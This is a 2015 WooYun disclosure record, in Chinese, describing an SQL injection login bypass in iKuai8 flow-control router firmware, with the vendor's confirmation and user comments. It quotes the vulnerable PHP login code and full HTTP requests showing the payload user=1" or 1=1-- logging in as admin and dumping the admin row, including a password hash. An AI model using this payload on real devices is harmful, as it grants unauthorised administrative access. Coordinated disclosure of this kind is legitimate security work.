{"id": 3891, "wybug_id": "wooyun-2015-0122413", "wybug_title": "爱快流控路由最新版(iKuai8_2.4.4_Build20150604-17_41)固件漏洞挖掘分析之一", "wybug_corp": "爱快免费流控路由", "wybug_author": "Bear baby", "wybug_date": "2015-06-24 10:35", "wybug_open_date": "2015-09-22 11:32", "wybug_type": "非授权访问", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-22：\t细节向公众公开  简要描述： 固件版本：iKuai8_2.4.4_Build20150604-17_41固件下载地址：http://patch.ikuai8.com/iso/iKuai8_2.4.4_Build20150604-17_41.iso分析使用到的工具：EditPlus、DreamWeaver、Zend Studio、Ida Pro 6.1、BeyondCompare、Fiddler、中国菜刀、Kali、VisualStudio2010、vmware11等注：本文基于逆向获取到的源文件进行分析。 详细说明：  0x01 注入漏洞1、\t绕过验证登陆后台爱快流控路由使用的是CodeIgniter框架，版本1.0。数据库sqllite。“CodeIgniter 是一个简单快速的PHP MVC框架。EllisLab 的工作人员发布了 CodeIgniter。许多企业尝试体验过所有 PHP MVC 框架之后，CodeIgniter 都成为赢家，主要是由于它为组织提供了足够的自由支持，允许开发人员更迅速地工作。”登陆页面的功能代码在/application/controllers/login.php登陆验证功能代码如下：\npublic function x()    {         $user = $_POST['user'];\t//注释：user直接用POST过来的参数        $pass = md5($user.md5($_POST['pass']));        $r = getAll($this->table,'username=\"'.$user.'\" and passwd=\"'.$pass.'\"'); //注释：sql语句拼接，user无任何过滤带入查询\t\t$r_lock = getAll($this->table,'username=\"' . $user . '\"');\t\tisset($r_lock[0]) and $r_lock = $r_lock[0];        //首先判断是否已经被锁定\t\tif (!empty($r_lock) && $r_lock['loginerror'] >= $this->login_error_time \t\t\t&& ($r_lock['logintime'] + $this->lock_time) > time()) {\t\t\t$data['recode'] = 2;\t\t\t$data['error'] = '您的账户被禁止5分钟';\t\t} else if (isset($r[0]['id'])){        \t            //判断是否被禁用            if($r[0]['state']!='up'){                $data['recode'] = 2;                $data['error'] = '您的账户已经被禁止';\t\t\t}else if($r[0]['authority'] == 'full' && $r[0]['id'] == 1){\t\t\t\t$_SESSION['uid'] = $r[0]['id'];\t\t\t\t$_SESSION['username'] = $user;\t\t\t    $_SESSION['authority']['checkfull'] = 1;                $data['recode'] = 0;                $data['error'] = '登录成功';            }else{\t\t\t\t$_SESSION['uid'] = $r[0]['id'];                $_SESSION['username'] = $user;                //拼接权限                $auth = explode(\"|\",$r[0]['authority']);                foreach ($auth as $k) {                    $tmp = explode(\":\",$k);                    $_SESSION['authority'][$tmp[0]] = $tmp[1];                }                               $data['recode'] = 0;                $data['error'] = '登录成功';            }\t\t\t\t\t\tif(!empty($r[0]['ip_addr']) && $this->iptolong($r[0]['ip_addr'])!='0'){//安全ip\t\t\t\t\t\t\t\t\t$ip=$this->iptolong($_SERVER['REMOTE_ADDR']);\t\t\t\t$ip_addr=explode('-',$r[0]['ip_addr']);\t\t\t\t\t\t\t\tif(!isset($ip_addr[1])){\t\t\t\t\t$ip_addr=$this->iptolong($ip_addr[0]);\t\t\t\t\t\t\t\t\t\tif($ip!=$ip_addr){\t\t\t\t\t\t$data['recode'] = 3;\t\t\t\t\t\t$data['error'] = '您的IP不是安全IP';\t\t\t\t\t}\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t$left=$this->iptolong($ip_addr[0]);\t\t\t\t\t$right=$this->iptolong($ip_addr[1]);\t\t\t\t\tif($ip<$left && $right>$ip){\t\t\t\t\t\t$data['recode'] = 3;\t\t\t\t\t\t$data['error'] = '您的IP不是安全IP';\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\t\t\t\t\t        } else {        \tif (!empty($r_lock)) {        \t\t//存在改用户名，密码错误，记录错误次数及登录时间        \t\t$update_data = array(        \t\t\t'loginerror' => empty($r_lock['loginerror']) ? 1 : ($r_lock['loginerror'] + 1),        \t\t\t'logintime'\t=> time()        \t\t);        \t\t        \t\tif (($r_lock['logintime'] + $this->lock_time) <= time()) {        \t\t\t//已经过了禁用期限，清除登录错误次数，当然本次登录错误要记录        \t\t\t$update_data['loginerror'] = 1;        \t\t}        \t\tautoExecute($this->table, $update_data, 'update', 'id=' . $r_lock['id']);        \t}            $data['recode'] = 1;            $data['error'] = '登录失败' . (isset($update_data) ? $update_data['loginerror'] . '次' : '');        }                if ($data['recode'] == 0) {        \t//登录成功，记录登录时间，清除登录失败次数        \t$update_data = array(        \t\t\t'loginerror' => 0,        \t\t\t'logintime'\t=> time()        \t);        \tautoExecute($this->table, $update_data, 'update', 'id=' . $r_lock['id']);        }//$data['debug'] = var_export($r_lock, true) . var_export($update_data, true);        echo json_encode($data);            }getAll函数在/application/helpers/db_helper.php里面/****************************************** * 查询所有数据 * 参数 ：$where 预留条件变量 *        $option 指定查询字段 * return：array */function getAll($table,$where='',$option=''){\treturn arrayToLevel(json_decode(ikGet($table,$where,'',$option),true));}\n最终是通过ikGet执行sql语句，ikGet是封装so文件里面，位置：usr\\lib\\php\\libikphp.so\n\nlibikphp.so主要对数据库查询、调用命令等功能进行封装。整个查询的SQL语句大概像下面的语句：\nselect * from webuser where username=’ $_POST['user']’ and passwd=’ d5($user.md5($_POST['pass']))’\n没有过滤，很常见的的sql注入。为了便于调试，在getAll 里面添加var_dump输出变量。\nvar_dump(arrayToLevel(json_decode(ikGet($table,$where,'',$option),true)));\n接下来我们来简单的验证一下先来个不存在用户1)用户名：1 密码：1Request\nPOST http://192.168.1.1/login/x HTTP/1.1Host: 192.168.1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://192.168.1.1/Content-Length: 13Cookie: PHPSESSID=e6b8bf28447de49246be1ee4b7876e49Connection: keep-alivePragma: no-cacheCache-Control: no-cacheuser=1&pass=1ResponseHTTP/1.1 200 OKX-Powered-By: PHP/5.3.1Content-Type: text/html;charset=utf-8Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheDate: Fri, 24 Apr 2015 06:28:39 GMTServer: lighttpd/1.4.30Content-Length: 73array(0) {}array(0) {}{\"recode\":1,\"error\":\"\\u767b\\u5f55\\u5931\\u8d25\"}\n再来个注入语句    2)用户名：1“ or 1=1—密码：1\nRequestPOST http://192.168.1.1/login/x HTTP/1.1Host: 192.168.1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://192.168.1.1/Content-Length: 23Cookie: PHPSESSID=e6b8bf28447de49246be1ee4b7876e49Connection: keep-alivePragma: no-cacheCache-Control: no-cacheuser=1\" or 1=1--&pass=1ResponseHTTP/1.1 200 OKX-Powered-By: PHP/5.3.1Content-Type: text/html;charset=utf-8Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheDate: Fri, 24 Apr 2015 06:29:09 GMTServer: lighttpd/1.4.30Content-Length: 811array(1) {  [0]=>  array(8) {    [\"id\"]=>    string(1) \"1\"    [\"state\"]=>    string(2) \"up\"    [\"username\"]=>    string(5) \"admin\"    [\"passwd\"]=>    string(32) \"c0e024d9200b5705bc4804722636378a\"    [\"ip_addr\"]=>    string(7) \"0.0.0.0\"    [\"authority\"]=>    string(4) \"full\"    [\"loginerror\"]=>    string(1) \"0\"    [\"logintime\"]=>    string(10) \"1429847267\"  }}array(1) {  [0]=>  array(8) {    [\"id\"]=>    string(1) \"1\"    [\"state\"]=>    string(2) \"up\"    [\"username\"]=>    string(5) \"admin\"    [\"passwd\"]=>    string(32) \"c0e024d9200b5705bc4804722636378a\"    [\"ip_addr\"]=>    string(7) \"0.0.0.0\"    [\"authority\"]=>    string(4) \"full\"    [\"loginerror\"]=>    string(1) \"0\"    [\"logintime\"]=>    string(10) \"1429847267\"  }}{\"recode\":0,\"error\":\"\\u767b\\u5f55\\u6210\\u529f\"} //登录成功\n成功绕过验证进入后台\n\n   漏洞证明：  \n\n   修复方案：  严格过滤。。。相信你们应该有经验了。预知后事如何 请听下回分解   版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-06-24 11:30 厂商回复： 熊宝同志和疯狗老板都来关注，受宠若惊+web同事疯狂受虐中，正在修复中，非常感谢白帽子和乌云平台，熊宝联系方式来一个，小礼物快递送出，等我虐完web的同事马上给您快递 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-24 10:37 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  学习新姿势    \n     2015-06-24 10:49 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @爱快免费流控路由 老板快出来。。。求关注我。。    \n     2015-06-24 10:52 |    \t\twy007 \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:10        | 其实我是一名卧底...)\t\t \n  @疯狗 姿势不对，起来重睡..    \n     2015-06-24 10:53 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @疯狗 狗哥来捧场了。。。有点小激动。    \n     2015-06-24 11:34 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  比起panabit都不敢来认领，爱快厚道多了    \n     2015-06-24 11:35 |    \t\tf4ck \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:7        | 有些人很牛B，一个漏洞能刷成N个。)\t\t \n  @Bear baby 帮你通知了爱快的负责人，他们在处理中了    \n     2015-06-24 11:36 |    \t\t爱快免费流控路由(乌云厂商)\t\t \n  感谢@f4ck @bear baby @疯狗 非常感谢各位的帮助，手忙脚乱修复中。。。    \n     2015-06-24 11:36 |    \t\t爱快免费流控路由(乌云厂商)\t\t \n  @Bear baby 来个联系方式，给您寄送小礼品，非常感谢您    \n     2015-06-24 11:36 |    \t\tchock \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:15        | 今夜我们都是wooyun人，我们一定要收购长亭)\t\t \n  是基于openwrt的吗？关注    \n     2015-06-24 11:42 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @爱快免费流控路由 嗯，谢谢老板。。给你了    \n     2015-06-24 13:01 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @f4ck 3Q    \n     2015-06-24 13:02 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  我擦,你们手速好快.....    \n     2015-06-24 13:03 |    \t\tCplusHua \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:33        | 乌云奖金:-1)\t\t \n  @Bear%20baby你这个漏洞能干啥?    \n     2015-06-24 13:10 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @CplusHua 等公开你就知道了。。    \n     2015-06-29 19:01 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Bear baby 洞主咋分析的源码？    \n     2015-06-29 21:30 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @疯狗 额。。。要后面放出来吗？今天挂科了，太伤心了。    \n     2015-06-29 22:24 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  去wiki    \n     2015-06-29 23:12 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @疯狗 发出来了。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}